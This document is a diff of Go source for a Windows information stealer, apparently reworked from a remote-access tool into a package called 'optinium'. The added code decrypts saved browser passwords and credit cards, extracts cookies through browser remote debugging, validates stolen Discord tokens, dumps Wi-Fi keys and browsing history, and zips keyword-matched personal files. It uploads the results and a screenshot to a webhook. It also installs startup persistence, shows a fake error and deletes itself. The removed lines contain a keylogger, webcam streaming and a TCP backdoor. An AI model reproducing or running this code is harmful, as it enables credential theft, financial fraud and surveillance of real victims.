@@ -1,7 +1,7 @@
-package main
+package optinium
 
 import (
-	"bufio"
+	"archive/zip"
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
@@ -11,153 +11,534 @@ import (
 	"fmt"
 	"image/jpeg"
 	"io"
-	"net"
+	"mime/multipart"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"os/user"
 	"path/filepath"
 	"regexp"
-	"runtime"
 	"strings"
 	"syscall"
 	"time"
 	"unsafe"
 
-	"github.com/atotto/clipboard"
-	"github.com/go-toast/toast"
 	"github.com/kbinani/screenshot"
-	"github.com/moutend/go-hook/pkg/keyboard"
-	"github.com/moutend/go-hook/pkg/types"
-	"github.com/shirou/gopsutil/v4/cpu"
-	"github.com/shirou/gopsutil/v4/host"
-	"github.com/shirou/gopsutil/v4/mem"
-	"github.com/ulikunitz/xz"
-	"gocv.io/x/gocv"
+	_ "github.com/mattn/go-sqlite3"
+	"github.com/shirou/gopsutil/cpu"
+	"github.com/shirou/gopsutil/host"
+	"github.com/shirou/gopsutil/mem"
+	"golang.org/x/net/websocket"
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
-	_ "modernc.org/sqlite"
 )
 
 var (
-	System      Connection
-	active      = false
-	logging     = false
-	information interface{}
-	DATA        strings.Builder
-	streaming   = false
+	WEBHOOK        string
+	IP             = getIP()
+	extractionName = fmt.Sprintf("%v@%v", os.Getenv("USERNAME"), IP)
+	SESSIONS       = [6]string{"Brave", "Chrome", "Edge", "Opera", "Opera GX", "Discord"}
+	APPDATA        = os.Getenv("APPDATA")
+	LOCAL          = os.Getenv("LOCALAPPDATA")
 
-	APPDATA = os.Getenv("APPDATA")
-	LOCAL   = os.Getenv("LOCALAPPDATA")
+	program   = os.Getenv("PROGRAMFILES")
+	program86 = os.Getenv("PROGRAMFILES(x86)")
 
-	CAPS = false
-	LOG  strings.Builder
-
-	KEYS = map[string]string{
-		"LMENU":      "L_ALT",
-		"RMENU":      "R_ALT",
-		"OEM_PERIOD": ".",
-		"OEM_COMMA":  ",",
-		"OEM_PLUS":   "+",
-		"OEM_MINUS":  "-",
-		"OEM_2":      "/",
-		"OEM_7":      "'",
-		"OEM_1":      ";",
-		"OEM_6":      "]",
-		"OEM_4":      "[",
-		"OEM_5":      "\\",
-		"OEM_3":      "`",
-		"SPACE":      "<SPACE>",
-		"BACK":       "<BACK>",
-		"UP":         "<ARROW_UP>",
-		"LEFT":       "<ARROW_LEFT>",
-		"DOWN":       "<ARROW_DOWN>",
-		"RIGHT":      "<ARROW_RIGHT>",
-		"LCONTROL":   "<L_CONTROL>",
-		"RCONTROL":   "<R_CONTROL>",
+	EXE_PATHS = [5]string{
+		filepath.Join(program, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
+		filepath.Join(program, "Google", "Chrome", "Application", "chrome.exe"),
+		filepath.Join(program86, "Microsoft", "Edge", "Application", "msedge.exe"),
+		filepath.Join(LOCAL, "Programs", "Opera", "opera.exe"),
+		filepath.Join(LOCAL, "Programs", "Opera GX", "opera.exe"),
 	}
 
-	REGEX = regexp.MustCompile(`[\w-]{24,26}\.[\w-]{6}\.[\w-]{38}`)
-
-	TOKEN_PATHS = [6]string{
-		filepath.Join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
-		filepath.Join(LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-		filepath.Join(LOCAL, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
-		filepath.Join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
-		filepath.Join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
-		filepath.Join(APPDATA, "discord", "Local Storage", "leveldb"),
+	USER_PATHS = [5]string{
+		filepath.Join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
+		filepath.Join(LOCAL, "Google", "Chrome", "User Data"),
+		filepath.Join(LOCAL, "Microsoft", "Edge", "User Data"),
+		filepath.Join(APPDATA, "Opera Software", "Opera Stable"),
+		filepath.Join(APPDATA, "Opera Software", "Opera GX Stable"),
 	}
 
 	LOCAL_PATHS = [5]string{
-		filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
-		filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State"),
-		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Local State"),
-		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable", "Local State"),
-		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local State"),
+		filepath.Join(USER_PATHS[0], "Local State"),
+		filepath.Join(USER_PATHS[1], "Local State"),
+		filepath.Join(USER_PATHS[2], "Local State"),
+		filepath.Join(USER_PATHS[3], "Local State"),
+		filepath.Join(USER_PATHS[4], "Local State"),
 	}
 
 	LOGIN_PATHS = [5]string{
-		filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
-		filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data"),
-		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data"),
-		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable", "Default", "Login Data"),
-		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data"),
+		filepath.Join(USER_PATHS[0], "Default", "Login Data"),
+		filepath.Join(USER_PATHS[1], "Default", "Login Data"),
+		filepath.Join(USER_PATHS[2], "Default", "Login Data"),
+		filepath.Join(USER_PATHS[3], "Default", "Login Data"),
+		filepath.Join(USER_PATHS[4], "Login Data"),
 	}
 
 	WEB_PATHS = [5]string{
-		filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Web Data"),
-		filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Web Data"),
-		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Web Data"),
-		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable", "Default", "Web Data"),
-		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Web Data"),
+		filepath.Join(USER_PATHS[0], "Default", "Web Data"),
+		filepath.Join(USER_PATHS[1], "Default", "Web Data"),
+		filepath.Join(USER_PATHS[2], "Default", "Web Data"),
+		filepath.Join(USER_PATHS[3], "Default", "Web Data"),
+		filepath.Join(USER_PATHS[4], "Web Data"),
 	}
 
-	SESSIONS = [6]string{"Brave", "Chrome", "Edge", "Opera", "Opera GX", "Discord"}
-	INFO     = "NULL;NULL;NULL;NULL"
-	IPINFO   = ""
+	HISTORY_PATHS = [5]string{
+		filepath.Join(USER_PATHS[0], "Default", "History"),
+		filepath.Join(USER_PATHS[1], "Default", "History"),
+		filepath.Join(USER_PATHS[2], "Default", "History"),
+		filepath.Join(USER_PATHS[3], "Default", "History"),
+		filepath.Join(USER_PATHS[4], "History"),
+	}
+
+	TOKEN_PATHS = [6]string{
+		filepath.Join(USER_PATHS[0], "Default", "Local Storage", "leveldb"),
+		filepath.Join(USER_PATHS[1], "Default", "Local Storage", "leveldb"),
+		filepath.Join(USER_PATHS[2], "Default", "Local Storage", "leveldb"),
+		filepath.Join(USER_PATHS[3], "Local Storage", "leveldb"),
+		filepath.Join(USER_PATHS[4], "Local Storage", "leveldb"),
+		filepath.Join(APPDATA, "discord", "Local Storage", "leveldb"),
+	}
+
+	regex = regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{38}`)
+
+	KEYS [][]byte
+
+	keywords = []string{
+		"pass", "cred", "auth", "log", "user", "name", "sign", "tok", "otp", "2fa", "mfa",
+		"ver", "sec", "unlock", "reset", "recov", "chall",
+		"id", "ssn", "soc", "card", "acc", "iban", "swift", "bic", "sort", "rout", "bank",
+		"tax", "vat", "pay", "bill", "inv", "sal", "stu", "earn",
+		"priv", "sec", "conf", "doc", "pers", "dat", "info", "prof", "rec", "rep",
+		"hist", "addr", "str", "city", "st", "post", "geo", "loc", "birth", "reg",
+		"med", "heal", "ins", "claim", "doc", "hosp", "pharm", "pres", "diag", "test",
+		"lic", "dl", "drv", "visa", "cit", "not", "cert",
+		"agr", "cont", "pol", "term", "nda", "fina",
+		"fing", "scan", "photo", "face", "self", "bio", "iris", "voice", "dna", "print",
+		"key", "pin", "puk", "hash", "dig", "sig", "wall", "crypt",
+		"empl", "job", "res", "cv", "hr", "work", "edu", "deg", "trans", "univ",
+		"mil", "gov", "clear", "top", "conf", "restr", "int", "class",
+		"bit", "eth", "fam", "bab", "db", "api", "@", "comp", "home", "main", "sour", "check",
+	}
+
+	dirs = []string{
+		"Desktop",
+		"Documents",
+		"Downloads",
+		"Favorites",
+		"Pictures",
+		"Videos",
+		"Music",
+		"OneDrive",
+		"Saved Games",
+		"Searches",
+		"Contacts",
+		"Links",
+		"AppData",
+	}
+
+	zipFile   *os.File
+	zipWriter *zip.Writer
 )
 
-type Connection struct {
-	Country string `json:"country_name"`
-	conn    net.Conn
-	reader  bufio.Reader
-	writer  bufio.Writer
+func win32CryptUnprotectedData(data []byte) []byte {
+	var outBlob windows.DataBlob
+	var inBlob = windows.DataBlob{Size: uint32(len(data)), Data: &data[0]}
+
+	windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
+
+	return unsafe.Slice(outBlob.Data, outBlob.Size)
 }
 
-func getIp() string {
-	resp, _ := http.Get("https://api.ipify.org/?format=txt")
-	body, _ := io.ReadAll(resp.Body)
-	return string(body)
-
+func InitHook(webhook string) {
+	WEBHOOK = webhook
 }
 
-func getLocation(ip string) {
-	resp, _ := http.Get(fmt.Sprintf("https://ipapi.co/%v/json/", ip))
-	json.NewDecoder(resp.Body).Decode(&System)
-	json.NewDecoder(resp.Body).Decode(&information)
-	IP, _ := json.MarshalIndent(information, "", " ")
-	IPINFO = string(IP)
-}
-
-func GetInfo() {
-	IPv4 := getIp()
-	getLocation(IPv4)
-	INFO = fmt.Sprintf("%v;%v;%v;%v", IPv4, System.Country, os.Getenv("USERNAME"), runtime.GOOS)
-
-}
-
-func connectToServer(ip string, port int) {
-	client, err := net.Dial("tcp", fmt.Sprintf("%v:%v", ip, port))
-	if err == nil {
-		System = Connection{"NULL", client, *bufio.NewReader(client), *bufio.NewWriter(client)}
-		writeResponse(INFO)
-		active = true
-	} else {
-		time.Sleep(time.Second * 5)
+func InitKeys() {
+	for _, path := range LOCAL_PATHS {
+		KEYS = append(KEYS, extractKey(path))
 	}
 }
 
-func persist() {
+func decryptData(data, key []byte) string {
+	aesBlock, _ := aes.NewCipher(key)
+	gcm, _ := cipher.NewGCM(aesBlock)
+
+	nonce := data[:gcm.NonceSize()]
+	ciphertext := data[gcm.NonceSize():]
+
+	data, _ = gcm.Open(nil, nonce, ciphertext, nil)
+	return string(data)
+}
+
+func extractKey(path string) []byte {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil
+	}
+	var result map[string]interface{}
+
+	json.Unmarshal(data, &result)
+
+	encodedKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
+	decodedKey, _ := base64.StdEncoding.DecodeString(encodedKey)
+
+	return win32CryptUnprotectedData(decodedKey[5:])
+}
+
+func getIP() string {
+	resp, _ := http.Get("https://api.ipify.org?format=txt")
+	ip, _ := io.ReadAll(resp.Body)
+	return string(ip)
+}
+
+func queryDB(path, query string) (*sql.Rows, error) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil, err
+	}
+	os.WriteFile("vault.db", data, 0644)
+
+	db, err := sql.Open("sqlite3", "vault.db")
+	if err != nil {
+		return nil, err
+	}
+	defer db.Close()
+
+	rows, err := db.Query(query)
+	if err != nil {
+		return nil, err
+	}
+
+	return rows, nil
+}
+
+func SendData(data string) {
+	var buff bytes.Buffer
+
+	writer := multipart.NewWriter(&buff)
+	file, _ := writer.CreateFormFile("file", extractionName+".log")
+	file.Write([]byte(data))
+	writer.Close()
+
+	http.Post(WEBHOOK, writer.FormDataContentType(), &buff)
+}
+
+func startDebug(exe, user string) {
+	cmd := exec.Command("taskkill.exe", "/F", "/IM", filepath.Base(exe))
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Run()
+
+	start(exe, "--remote-debugging-port=9222", "--remote-allow-origins=*", "--headless", "--user-data-dir="+user)
+
+	time.Sleep(time.Second)
+}
+
+func getWsURL() string {
+	resp, _ := http.Get("http://localhost:9222/json")
+
+	var jsonData []map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&jsonData)
+
+	return jsonData[0]["webSocketDebuggerUrl"].(string)
+}
+
+type cookieResp struct {
+	Id     int    `json:"id"`
+	Result Result `json:"result"`
+}
+type Result struct {
+	Cookies []Cookie `json:"cookies"`
+}
+
+type Cookie struct {
+	Expires int    `json:"expires"`
+	Session bool   `json:"session"`
+	Secure  bool   `json:"secure"`
+	Name    string `json:"name"`
+	Domain  string `json:"domain"`
+	Value   string `json:"value"`
+}
+
+func CookieData() string {
+	var cookieData strings.Builder
+
+	for i, exe := range EXE_PATHS {
+		if _, err := os.Stat(exe); err == nil {
+			startDebug(exe, USER_PATHS[i])
+
+			ws, _ := websocket.Dial(getWsURL(), "", "http://localhost/")
+			defer ws.Close()
+
+			msg, _ := json.Marshal(map[string]interface{}{"id": 1, "method": "Network.getAllCookies"})
+			ws.Write(msg)
+
+			var resp []byte
+			websocket.Message.Receive(ws, &resp)
+			cmd := exec.Command("taskkill.exe", "/F", "/IM", filepath.Base(exe))
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmd.Run()
+
+			var data cookieResp
+			json.Unmarshal(resp, &data)
+
+			for _, cookie := range data.Result.Cookies {
+				if time.Unix(int64(cookie.Expires), 0).After(time.Now()) {
+					cookieData.WriteString(fmt.Sprintf("==============================[COOKIES]==============================\nBrowser: %v\nDomain: %v\nSecure: %v\nSession: %v\nName: %v\nValue: %v\n\n", SESSIONS[i], cookie.Domain, cookie.Secure, cookie.Session, cookie.Name, cookie.Value))
+				}
+			}
+		}
+	}
+	return cookieData.String()
+}
+
+func SystemData() string {
+	currentUser, _ := user.Current()
+	memInfo, _ := mem.VirtualMemory()
+	cpuInfo, _ := cpu.Info()
+	hostInfo, _ := host.Info()
+
+	data := map[string]interface{}{
+		"User":   currentUser,
+		"Host":   hostInfo,
+		"CPU":    cpuInfo,
+		"Memory": memInfo,
+	}
+
+	rawData, _ := json.MarshalIndent(data, "", " ")
+
+	systemData := fmt.Sprintf("==============================[SYSTEM]==============================\n%v\n%v\n%v\n\n", string(rawData), run("systeminfo"), run("getmac"))
+
+	return systemData
+}
+
+func DiscordData() string {
+	var discordData strings.Builder
+	for index, path := range TOKEN_PATHS {
+		files, err := os.ReadDir(path)
+		if err == nil {
+			for _, file := range files {
+				if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
+					data, _ := os.ReadFile(filepath.Join(path, file.Name()))
+					lines := strings.Split(string(data), "\n")
+					for _, line := range lines {
+						tokens := regex.FindAllString(line, -1)
+						for _, token := range tokens {
+							req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
+							req.Header.Set("Authorization", token)
+							resp, _ := http.DefaultClient.Do(req)
+							if resp.StatusCode == http.StatusOK {
+								var userData interface{}
+								json.NewDecoder(resp.Body).Decode(&userData)
+								prettyData, _ := json.MarshalIndent(userData, "", " ")
+								discordData.WriteString(fmt.Sprintf("==============================[DISCORD]==============================\nSession: %v\nToken: %v\n%v\n\n", SESSIONS[index], token, string(prettyData)))
+							}
+						}
+					}
+				}
+
+			}
+		}
+	}
+	return discordData.String()
+}
+
+func LoginData() string {
+	var loginData strings.Builder
+	defer os.Remove("vault.db")
+
+	for index, path := range LOGIN_PATHS {
+		rows, err := queryDB(path, "SELECT origin_url, username_value, password_value FROM logins;")
+		if err == nil {
+			for rows.Next() {
+				var url, username, password string
+				rows.Scan(&url, &username, &password)
+
+				if strings.HasPrefix(password, "v10") {
+					password = decryptData([]byte(password[3:]), KEYS[index])
+					if password != "" {
+						loginData.WriteString(fmt.Sprintf("==============================[LOGIN]==============================\nBrowser: %v\nUrl: %v\nUsername: %v\nPassword: %v\n\n", SESSIONS[index], url, username, password))
+					}
+				}
+			}
+		}
+	}
+	return loginData.String()
+}
+
+func VisitedURLs() string {
+	var visited = map[string]int{}
+	var visitedURLs strings.Builder
+	defer os.Remove("vault.db")
+
+	for _, path := range HISTORY_PATHS {
+		rows, err := queryDB(path, "SELECT url, visit_count FROM urls;")
+		if err == nil {
+			for rows.Next() {
+				var urls string
+				var visits int
+
+				rows.Scan(&urls, &visits)
+				parsedURL, err := url.Parse(urls)
+				if err != nil {
+					continue
+				}
+				if parsedURL.Host != "" {
+					visited[parsedURL.Host] += visits
+				}
+			}
+		}
+	}
+	for urls, visits := range visited {
+		visitedURLs.WriteString(fmt.Sprintf("==============================[VISITED-URLs]==============================\nURL: %v\nVisits: %v\n\n", urls, visits))
+	}
+
+	return visitedURLs.String()
+}
+
+func IpData() string {
+	var ipData interface{}
+
+	resp, _ := http.Get(fmt.Sprintf("https://ipapi.co/%v/json/", IP))
+	json.NewDecoder(resp.Body).Decode(&ipData)
+	pretty, _ := json.MarshalIndent(ipData, "", " ")
+
+	return fmt.Sprintf("==============================[IP]==============================\n%v\n%v\n%v\n", string(pretty), run("ipconfig"), run("netstat -ano"))
+}
+
+func CardData() string {
+	var cardData strings.Builder
+	defer os.Remove("vault.db")
+
+	for index, path := range WEB_PATHS {
+		rows, err := queryDB(path, "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards;")
+		if err == nil {
+			for rows.Next() {
+				var name, number, expiration_m, expiration_y string
+				rows.Scan(&name, &number, &expiration_m, &expiration_y)
+
+				if strings.HasPrefix(number, "v10") {
+					number = decryptData([]byte(number[3:]), KEYS[index])
+					if number != "" {
+						cardData.WriteString(fmt.Sprintf("==============================[CREDIT-CARD]==============================\nBrowser: %v\nCard_Owner: %s\nCard_Number: %s\nExpiration_Month: %v\nExpiration_Year: %v\n\n", SESSIONS[index], name, number, expiration_m, expiration_y))
+					}
+				}
+			}
+		}
+
+	}
+	return cardData.String()
+}
+
+func WifiData() string {
+	var wifiData strings.Builder
+	out := run("netsh wlan show profiles")
+	lines := strings.Split(out, "\n")
+
+	for _, line := range lines {
+		if strings.Contains(line, "All User Profile") {
+			profile := strings.TrimSpace(strings.Split(line, ":")[1])
+
+			out = run(fmt.Sprintf("netsh wlan show profile name=%v key=clear", profile))
+			lines := strings.Split(out, "\n")
+
+			for _, line := range lines {
+				if strings.Contains(line, "Key Content") {
+					parts := strings.Split(line, ":")
+					if len(parts) != 2 {
+						continue
+					}
+					key := strings.TrimSpace(parts[1])
+					wifiData.WriteString(fmt.Sprintf("==============================[WIFI]==============================\nProfile: %v\nKey: %s\n\n", profile, key))
+				}
+			}
+		}
+	}
+	return wifiData.String()
+}
+
+func Screenshot() {
+	var img bytes.Buffer
+	image, _ := screenshot.CaptureDisplay(0)
+	jpeg.Encode(&img, image, nil)
+
+	var buff bytes.Buffer
+
+	writer := multipart.NewWriter(&buff)
+	file, _ := writer.CreateFormFile("file", "screen.jpg")
+	file.Write(img.Bytes())
+	writer.Close()
+
+	http.Post(WEBHOOK, writer.FormDataContentType(), &buff)
+}
+
+func addToZip(path string) {
+	file, _ := os.Open(path)
+	defer file.Close()
+
+	writer, _ := zipWriter.Create(filepath.Base(path))
+	io.Copy(writer, file)
+}
+
+func in(item string, slice []string) bool {
+	for _, i := range slice {
+		if strings.Contains(strings.ToLower(item), strings.ToLower(i)) {
+			return true
+		}
+	}
+	return false
+}
+
+func enumDir(dir string) {
+	entries, _ := os.ReadDir(dir)
+
+	for _, entry := range entries {
+		file, _ := entry.Info()
+
+		if file.IsDir() {
+			enumDir(dir + file.Name() + "/")
+		} else if in(file.Name(), keywords) && file.Size() < 10000 && !file.IsDir() {
+			addToZip(dir + file.Name())
+		}
+	}
+}
+
+func StealFiles() {
+	var zipFile bytes.Buffer
+
+	zipWriter = zip.NewWriter(&zipFile)
+
+	USERDIR := os.Getenv("USERPROFILE")
+	os.Chdir(USERDIR)
+
+	entries, _ := os.ReadDir("./")
+
+	for _, entry := range entries {
+		file, _ := entry.Info()
+		if file.IsDir() && in(file.Name(), dirs) {
+			if file.Name() == "AppData" {
+
+			} else {
+				enumDir("./" + file.Name() + "/")
+			}
+		} else if in(file.Name(), keywords) && file.Size() < 20000 && !file.IsDir() {
+			addToZip("./" + file.Name())
+		}
+	}
+	zipWriter.Close()
+
+	var formBuffer bytes.Buffer
+	writer := multipart.NewWriter(&formBuffer)
+	file, _ := writer.CreateFormFile("file", extractionName+".zip")
+	file.Write(zipFile.Bytes())
+	writer.Close()
+
+	http.Post(WEBHOOK, writer.FormDataContentType(), &formBuffer)
+}
+
+func Persist() {
 	self, _ := os.Executable()
 	startUpPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "config.pif")
 	msPath := filepath.Join(os.Getenv("WINDIR"), "Tasks", "microsoft.com")
@@ -176,515 +557,29 @@ func persist() {
 	key.Close()
 }
 
-func writeResponse(response string) {
-	System.writer.WriteString(response + "\n")
-	System.writer.Flush()
+func FakeError() {
+	start("powershell.exe", "/c", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\"An error occurred while trying to run the application.\", \"Error 0x800204\", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)")
+
+}
+
+func start(name string, args ...string) {
+	cmd := exec.Command(name, args...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Start()
+}
+
+func SelfDestruct() {
+	SELF, _ := os.Executable()
+	start("cmd.exe", "/c", fmt.Sprintf("del %v", SELF))
+}
+
+func Sleep() {
+	time.Sleep(20 * time.Second)
 }
 
 func run(command string) string {
-	cmd := exec.Command("powershell.exe", "-NoLogo", "-NonInteractive", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command)
+	cmd := exec.Command("powershell.exe", "-c", command)
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	out, _ := cmd.Output()
-	return strings.TrimSpace(string(out))
-}
-
-func notify(appname, title, message string) {
-	notification := toast.Notification{
-		AppID:   appname,
-		Title:   title,
-		Message: message,
-		Audio:   toast.Default,
-	}
-	notification.Push()
-}
-
-func discordInfo() {
-	for index, PATH := range TOKEN_PATHS {
-		FILES, err := os.ReadDir(PATH)
-		if err != nil {
-			continue
-		}
-		for _, FILE := range FILES {
-			if strings.HasSuffix(FILE.Name(), ".ldb") || strings.HasSuffix(FILE.Name(), ".log") {
-				FILE_BYTES, _ := os.ReadFile(filepath.Join(PATH, FILE.Name()))
-				LINES := strings.Split(string(FILE_BYTES), "\n")
-				for _, LINE := range LINES {
-					TOKENS := REGEX.FindAllString(LINE, -1)
-					for _, TOKEN := range TOKENS {
-						REQ, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
-						REQ.Header.Set("Authorization", TOKEN)
-						RESP, _ := http.DefaultClient.Do(REQ)
-						if RESP.StatusCode == http.StatusOK {
-							json.NewDecoder(RESP.Body).Decode(&information)
-							BODY, _ := json.MarshalIndent(information, "", " ")
-							DATA.WriteString(fmt.Sprintf("===========================[DISCORD]===========================\nSession: %v\nToken: %v\n%v\n", SESSIONS[index], TOKEN, string(BODY)))
-						}
-					}
-				}
-			}
-		}
-	}
-}
-
-func CryptUnprotectedData(data []byte) []byte {
-	var outBlob windows.DataBlob
-	var inBlob = windows.DataBlob{Size: uint32(len(data)), Data: &data[0]}
-
-	windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
-
-	return unsafe.Slice(outBlob.Data, outBlob.Size)
-}
-
-func extractKey(path string) []byte {
-	data, err := os.ReadFile(path)
-	if err != nil {
-		return nil
-	}
-
-	var result map[string]interface{}
-	json.Unmarshal(data, &result)
-
-	encodedKey, _ := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
-	decodedKey, _ := base64.StdEncoding.DecodeString(encodedKey)
-
-	return CryptUnprotectedData(decodedKey[5:])
-}
-
-func decryptData(encryptedData []byte, encryptionKey []byte) string {
-	aesCipher, _ := aes.NewCipher(encryptionKey)
-	gcmCipher, _ := cipher.NewGCM(aesCipher)
-
-	nonceSize := gcmCipher.NonceSize()
-	nonce := encryptedData[:nonceSize]
-	ciphertext := encryptedData[nonceSize:]
-
-	plaintext, _ := gcmCipher.Open(nil, nonce, ciphertext, nil)
-	return string(plaintext)
-}
-
-func browserInfo() {
-	for index, path := range LOGIN_PATHS {
-		data, err := os.ReadFile(path)
-		if err != nil {
-			continue
-		}
-		os.WriteFile("vault.db", data, 0644)
-		defer os.Remove("vault.db")
-
-		db, _ := sql.Open("sqlite", "vault.db")
-		defer db.Close()
-
-		rows, _ := db.Query("SELECT origin_url, username_value, password_value FROM logins;")
-		defer rows.Close()
-
-		for rows.Next() {
-			var url, username, password string
-			rows.Scan(&url, &username, &password)
-			if strings.HasPrefix(password, "v10") {
-				password = decryptData([]byte(password[3:]), extractKey(LOCAL_PATHS[index]))
-				if password != "" {
-					DATA.WriteString(fmt.Sprintf("==========================[LOGIN]=============================\nBrowser: %v\nURL: %v\nUsername: %v\nPassword: %v\n\n", SESSIONS[index], url, username, password))
-				}
-			}
-		}
-
-	}
-}
-
-func wifiInfo() {
-	out := run("netsh wlan show profiles")
-	lines := strings.Split(out, "\n")
-
-	for _, line := range lines {
-		if strings.Contains(line, "All User Profile") {
-			profile := strings.TrimSpace(strings.Split(line, ":")[1])
-
-			out = run(fmt.Sprintf("netsh wlan show profile name=%v key=clear", profile))
-			lines := strings.Split(out, "\n")
-
-			for _, line := range lines {
-				if strings.Contains(line, "Key Content") {
-					parts := strings.Split(line, ":")
-					if len(parts) < 2 {
-						continue
-					}
-					key := strings.TrimSpace(parts[1])
-					DATA.WriteString(fmt.Sprintf("==============================[WIFI]==============================\nProfile: %v\nKey: %s\n\n", profile, key))
-				}
-			}
-		}
-	}
-}
-
-func sysInfo() {
-	CURRENT_USER, _ := user.Current()
-	memInfo, _ := mem.VirtualMemory()
-	cpuInfo, _ := cpu.Info()
-	hostInfo, _ := host.Info()
-
-	DATA.WriteString(fmt.Sprintf("=========================[SYSTEM]=========================\nOS: %v (%v)\nArchitecure: %v (%v)\nHostname: %v\nFull Name: %v\nHome: %v\nUser ID: %v\nRAM: %v GB\nCPU: %v (%v cores)\nEnvironment: %v\n\n%v\n\n%v\n\n",
-		hostInfo.Platform,
-		hostInfo.PlatformVersion,
-		runtime.GOARCH,
-		hostInfo.KernelArch,
-		CURRENT_USER.Username,
-		CURRENT_USER.Name,
-		CURRENT_USER.HomeDir,
-		CURRENT_USER.Uid,
-		(memInfo.Total / 1024 / 1024 / 1024),
-		cpuInfo[0].ModelName,
-		len(cpuInfo),
-		os.Environ(),
-		run("systeminfo"),
-		run("getmac"),
-	))
-}
-
-func fetchData() {
-	sysInfo()
-	wifiInfo()
-	DATA.WriteString(IPINFO)
-	discordInfo()
-	browserInfo()
-
-	writeResponse("<START>")
-	writeResponse(DATA.String())
-	writeResponse("<END>")
-	DATA.Reset()
-}
-
-func stream() {
-	for streaming {
-		img, err := screenshot.CaptureDisplay(0)
-		if err != nil {
-			writeResponse("<ERR>")
-			streaming = false
-		}
-		jpeg.Encode(System.conn, img, nil)
-		time.Sleep(time.Millisecond * 50)
-	}
-}
-
-func streamCam() {
-	camera, err := gocv.OpenVideoCapture(0)
-	if err != nil {
-		writeResponse("<ERR>")
-		streaming = false
-	}
-	defer camera.Close()
-
-	frame := gocv.NewMat()
-	defer frame.Close()
-
-	for streaming {
-		camera.Read(&frame)
-		img, _ := frame.ToImage()
-		jpeg.Encode(System.conn, img, nil)
-		time.Sleep(time.Millisecond * 50)
-	}
-}
-
-func listenKeystrokes(stat bool) {
-	logging = stat
-	channel := make(chan types.KeyboardEvent, 100)
-	keyboard.Install(nil, channel)
-	for logging {
-		key := <-channel
-		char := strings.Replace(key.VKCode.String(), "VK_", "", 1)
-		if value, exists := KEYS[char]; exists {
-			char = value
-		}
-		switch key.Message {
-		case types.WM_KEYDOWN:
-			switch key.VKCode {
-			case types.VK_CAPITAL:
-				CAPS = !CAPS
-				if CAPS {
-					LOG.WriteString("<CAPITAL>\n")
-				} else {
-					LOG.WriteString("<capital>\n")
-				}
-			case types.VK_LSHIFT:
-				if !CAPS {
-					CAPS = true
-					LOG.WriteString("<L_SHIFT>\n")
-				}
-			default:
-				if CAPS {
-					LOG.WriteString(char + "\n")
-				} else {
-					LOG.WriteString(strings.ToLower(char) + "\n")
-				}
-			}
-
-		case types.WM_KEYUP:
-			if key.VKCode == types.VK_LSHIFT {
-				CAPS = false
-				LOG.WriteString("</l_shift>\n")
-			}
-		}
-	}
-	keyboard.Uninstall()
-}
-func setWallpaper(path *uint16) {
-	user32 := syscall.NewLazyDLL("user32.dll")
-	proc := user32.NewProc("SystemParametersInfoW")
-
-	proc.Call(20, 0, uintptr(unsafe.Pointer(path)))
-}
-
-func getWallpaper(url string) {
-	resp, err := http.Get(url)
-	if err == nil {
-		data, _ := io.ReadAll(resp.Body)
-		os.WriteFile("temp.jpg", data, 0644)
-
-		path, _ := filepath.Abs("temp.jpg")
-		pathPtr := syscall.StringToUTF16Ptr(path)
